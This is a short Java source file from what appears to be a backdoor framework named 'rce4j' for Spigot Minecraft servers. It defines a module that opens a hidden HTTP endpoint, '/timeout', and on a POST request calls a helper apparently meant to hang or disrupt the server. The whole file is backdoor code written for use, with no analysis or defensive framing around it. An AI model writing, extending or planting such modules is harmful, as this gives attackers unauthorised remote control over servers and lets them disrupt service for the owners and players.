package org.rce4j.module.impl;

import org.rce4j.SpigotUtil;
import org.rce4j.module.BackdoorHttpModule;
import org.rce4j.module.event.BackdoorHttpEvent;
import org.rce4j.net.HttpCode;

public class TimeoutModule extends BackdoorHttpModule {
    public TimeoutModule() {
        super("spigot-timeout", "/timeout");
    }
    
    @Override
    public void onPost(BackdoorHttpEvent event) {
        SpigotUtil.timeout();
        
        event.status(HttpCode.OK_200);
    }
}
